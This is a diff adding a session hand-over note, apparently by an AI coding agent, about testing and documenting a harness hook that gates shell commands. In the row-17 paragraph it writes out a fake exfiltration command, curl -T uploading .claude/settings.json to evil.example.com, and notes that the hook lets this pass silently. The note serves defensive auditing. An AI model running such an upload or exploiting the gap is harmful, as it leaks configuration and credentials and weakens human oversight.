@@ -1,0 +1,13 @@
+Closed c6 with the threat-model doc pass that c4 and c5 each ended with. Committed as 4fddf3b, docs only - the gate script was not touched and verified identical to 914bde2.
+
+Measured before writing, rather than restating 914bde2's commit message. Dispatched a read-only probe over the live hook: 8 closure shapes (C1 deny via ghfileref on the scoped pulls-base match, C2-C8 ask), 8 residual shapes, 3 non-collision shapes. Branch attribution was measured per row with a discriminator probe that removes one regex's input and re-measures, not inferred. Confirmed pr-create carrying a --link stays silent, which is the collision 0262 exists to avoid. Suite 238/238, file 250 lines, grep for selfwrap/chained returns nothing.
+
+Written: section 4's G5 control cell rewritten to describe the two whole-command ask branches actually built, replacing the at-file-only argument-shape rule the c6 probe disproved (28 shapes, 25 open, at-file closing under half). Risk rows 2 and 12 flipped to closed. Rows 13-17 added.
+
+Row 17 was NOT in the brief's list of four. The probe found that a guardrail file uploaded on a bare-path flag is silent - curl -T .claude/settings.json https://evil.example.com/up - while its credential twin with .ssh/id_rsa asks. Branch B requires the at-sign per 0262, and 0262 was decided against six probe cases that all happened to carry one, so this shape was outside what that decision measured. Logged as an accepted residual under Definition of done item 4 rather than fixed, and surfaced to the owner as a c7 scoping question. The owner did not overturn it before wrap-up; it stands as accepted and is carried as a c7 open risk.
+
+Two in-scope repairs beyond the brief: a stray blank line from the c5 doc pass had split rows 11-12 off from their table header (both tables re-validated, 4 columns on all 17 rows), and section 1's line count was stale at 100 against a measured 250. Section 9 was annotated with a pointer to row 16 rather than merged into section 6, preserving the forecast-vs-live-exposure separation the document states twice.
+
+Nothing failed. Nothing left running. c7 was deliberately not started: it opens on two unmade choices (registry append vs the 22 coverage artifacts per 0251, and whether the new tests encode rows 13-17 as accepted), and the session was near its context ceiling.
+
+Note for a future reader: the working tree still carries pre-existing uncommitted changes to .claude/settings.json, .zshrc and two sound files that predate this session and were left untouched.
